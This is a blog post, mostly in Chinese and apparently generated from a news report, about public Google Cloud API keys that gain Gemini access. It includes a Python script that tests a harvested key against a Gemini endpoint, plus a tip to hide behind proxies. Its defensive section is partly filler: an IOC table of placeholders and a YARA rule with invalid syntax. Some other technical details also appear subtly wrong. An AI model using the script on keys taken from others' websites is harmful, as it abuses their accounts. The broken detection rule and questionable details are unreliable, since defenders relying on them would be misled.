---
layout: post
title:  "Thousands of Public Google Cloud API Keys Exposed with Gemini Access After API Enablement"
date:   2026-02-28 12:31:20 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Google Cloud API Key 的 Gemini 端點滲透利用
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Unauthenticated Access to Sensitive Data
> * **關鍵技術**: API Key Abuse, Unrestricted API Access, Gemini Endpoint Exploitation

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Google Cloud API Key 的設計初衷是作為計費識別碼，但當用戶啟用 Gemini API 時，現有的 API Key 會自動獲得 Gemini 端點的存取權限，而無需額外的授權或通知。
* **攻擊流程圖解**:
  1. 攻擊者從網站的 client-side 代碼中擷取 Google API Key。
  2. 攻擊者使用擷取的 API Key 向 Gemini 端點發送請求。
  3. Gemini 端點驗證 API Key 並授予存取權限。
* **受影響元件**: Google Cloud API Key、Gemini API、Google Cloud 项目。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要擷取 Google API Key。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    api_key = "AIzaSy...your_api_key..."
    url = "https://gemini.googleapis.com/v1/files"
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print("Access granted!")
    else:
        print("Access denied.")
    
    ```
* **繞過技術**: 攻擊者可以使用各種方法來繞過安全措施，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule google_api_key_abuse {
        meta:
            description = "Detects Google API Key abuse"
            author = "Your Name"
        strings:
            $api_key = "AIzaSy"
        condition:
            $api_key in (all of them)
    }
    
    ```
* **緩解措施**: 用戶應該旋轉 API Key、限制 API Key 的存取權限、啟用安全措施（例如兩步 驗證）。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **API Key (API鑰匙)**: 一種用於驗證 API 請求的鑰匙。
* **Gemini Endpoint (Gemini 端點)**: 一種用於存取敏感數據的端點。
* **Unrestricted API Access (無限制 API 存取)**: 一種允許 API Key 存取所有啟用的 API 的設定。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/thousands-of-public-google-cloud-api.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


